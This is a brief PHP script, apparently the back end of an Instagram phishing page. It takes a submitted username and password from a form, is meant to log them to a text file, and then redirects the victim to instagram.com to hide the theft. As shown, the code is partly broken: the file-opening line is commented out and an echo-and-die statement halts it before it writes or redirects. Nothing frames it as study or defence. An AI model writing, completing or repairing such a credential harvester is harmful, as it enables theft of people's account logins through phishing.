<?php

//$handle = fopen("logs.txt", "a");
$username = $_POST['username'];
$passwrd = $_POST['password'];
   
 echo    $mydata = $username ." =" . $passwrd; die;
  fwrite($handle, $mydata);
   
   fwrite($handle, "\r   \n"); 

//fwrite($handle, "\r   \n   \n");
fclose($handle);
//exit;

header ('Location:https://instagram.com');

?>
